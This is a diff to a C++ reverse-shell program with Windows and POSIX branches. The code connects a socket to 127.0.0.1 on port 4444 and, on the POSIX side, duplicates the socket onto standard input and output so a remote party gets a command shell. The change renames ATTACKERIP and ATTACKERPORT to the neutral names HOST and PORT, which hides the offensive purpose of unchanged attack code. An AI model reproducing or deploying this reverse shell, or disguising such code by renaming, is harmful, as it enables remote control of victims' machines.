@@ -15,8 +15,8 @@ typedef SOCKET SOCKETTYPE;
 typedef int SOCKETTYPE;
 #endif
 
-const char* ATTACKERIP = "127.0.0.1";
-const int ATTACKERPORT = 4444;
+const char* HOST = "127.0.0.1";
+const int PORT = 4444;
 
 int main() {
 #if defined(_WIN32) || defined(WIN32)
@@ -30,15 +30,15 @@ int main() {
 
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(ATTACKERPORT);
-    addr.sin_addr.s_addr = inet_addr(ATTACKERIP);
+    addr.sin_port = htons(PORT);
+    addr.sin_addr.s_addr = inet_addr(HOST);
 
     if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
         WSACleanup();
         return 1;
     }
 
-    std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
+    std::cout << "Connected to " << HOST << ":" << PORT << std::endl;
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -62,13 +62,13 @@ int main() {
 
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(ATTACKERPORT);
-    addr.sin_addr.s_addr = inet_addr(ATTACKERIP);
+    addr.sin_port = htons(PORT);
+    addr.sin_addr.s_addr = inet_addr(HOST);
 
     if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) < 0)
         return 1;
 
-    std::cout << "Connected to " << ATTACKERIP << ":" << ATTACKERPORT << std::endl;
+    std::cout << "Connected to " << HOST << ":" << PORT << std::endl;
 
     dup2(s, 0);
     dup2(s, 1);
